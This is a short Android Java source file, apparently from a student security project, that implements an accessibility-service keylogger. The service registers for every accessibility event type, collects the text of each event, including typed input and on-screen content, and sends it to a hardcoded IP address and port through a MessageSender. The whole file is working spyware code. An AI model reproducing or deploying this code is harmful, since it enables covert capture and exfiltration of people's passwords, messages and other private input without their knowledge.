package com.ict2207.ensringring;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.view.accessibility.AccessibilityEvent;

public class MyAccessibilityService extends AccessibilityService {

    public void send(String s1){
        if (ip==null){
            ip="10.0.2.2";
            port="4453";
        }
        if (ip!="none" || port!="none"){
            MessageSender messageSender = new MessageSender();
            messageSender.execute(s1,ip,port);
        }
    }

    static final String TAG = "RecorderService";
    String ip=null;
    String port;

    private String getEventText(AccessibilityEvent event) {
        StringBuilder sb = new StringBuilder();
        for (CharSequence s : event.getText()) {
            sb.append(s);
        }
        return sb.toString();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        String l1=getEventText(event);
        if (!(l1=="")){
            send(l1);
        }
    }

    @Override
    public void onInterrupt() {
        send("[-] Interrupted !!! ");
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        send("[+] Connected");
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.flags = AccessibilityServiceInfo.DEFAULT;
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        setServiceInfo(info);
    }
}